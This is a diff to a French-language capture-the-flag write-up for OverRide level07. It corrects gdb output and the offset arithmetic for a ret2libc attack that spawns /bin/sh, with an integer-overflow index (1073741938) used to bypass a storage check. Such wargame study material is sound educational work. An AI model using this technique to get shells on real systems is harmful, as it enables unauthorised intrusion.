@@ -101,7 +101,7 @@ Ce programme nous donne un prompt pour stocker et afficher des nombres dans un i
 ➜  level07 git:(main) ✗ bc
 bc 1.08.2
 2^32
-4294967296 # INT MAX
+4294967296 # U_INTMAX + 1
 4294967296 / 4 # On divise par 4 car nous sommes en 32-bits
 1073741824
 ```
@@ -138,28 +138,44 @@ Input command: read
 L'idee est donc de faire un `ret2libc` pour executer `system("/bin/sh")` a l'aide de la `libc` compilee avec notre binaire. Pour ceci nous devons trouver l'adresse de `buff` et l'adresse de retour de `main()`. Ensuite la difference entre ces deux adresses nous donnera l'offset a partir du quel ecrire notre nouvelle adresse:
 
 ```s
-(gdb) break *0x08048636 # Debut de store_number -> trouver adresse de buff
-(gdb) break *0x080489f1 # instruction ret de main -> trouver adresse de retour
+(gdb) b store_number
+Breakpoint 1 at 0x8048636
 (gdb) run
-Starting program: /home/users/level07/level07
-# ...
+Starting program: /home/users/level07/level07 
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!   
+----------------------------------------------------
+ Commands:                                          
+    store - store a number into the data storage    
+    read  - read a number from the data storage     
+    quit  - exit the program                        
+----------------------------------------------------
+   wil has reserved some storage :>                 
+----------------------------------------------------
+
 Input command: store
 
 Breakpoint 1, 0x08048636 in store_number ()
-(gdb) x $ebp + 0x8
-0xffffd530:     0xffffd554
-(gdb) lay asm
-(gdb) c
-# ...
-Input command: quit
+(gdb) x $ebp+0x8
+0xffffd530:	0xffffd554
 
-Breakpoint 2, 0x080489f1 in main ()
-(gdb) x $esp
-0xffffd71c:     0xf7e45513
-(gdb)
+
+(gdb) b main
+Breakpoint 1 at 0x8048729
+(gdb) run
+Starting program: /home/users/level07/level07 
+
+Breakpoint 1, 0x08048729 in main ()
+(gdb) info frame
+Stack level 0, frame at 0xffffd720:
+ eip = 0x8048729 in main; saved eip 0xf7e45513
+ Arglist at 0xffffd718, args: 
+ Locals at 0xffffd718, Previous frame's sp is 0xffffd720
+ Saved registers:
+  ebp at 0xffffd718, eip at 0xffffd71c
 ```
 
-Donc nous devons faire `0xffffd71c - 0xffffd71c` ce qui nous donne `456` ensuite on divise ce nombre par 4 (systeme 32-bits) et nous obtenons `114`. Nous savons donc que nous devons ecrire notre adresse de retour a l'index `114` le probleme est que ce nombre est divisible par 3. Pour contourner ce probleme nous allons utiliser un `integer overflow` grace au nombre que nous avons trouve au debut: `1073741824 + 114 = 1073741938`
+Donc nous devons faire `0xffffd71c - 0xffffd554` ce qui nous donne `456` ensuite on divise ce nombre par 4 (systeme 32-bits) et nous obtenons `114`. Nous savons donc que nous devons ecrire notre adresse de retour a l'index `114` le probleme est que ce nombre est divisible par 3. Pour contourner ce probleme nous allons utiliser un `integer overflow` grace au nombre que nous avons trouve au debut: `1073741824 + 114 = 1073741938`
 
 ```bash
 level07@OverRide:~$ ./level07
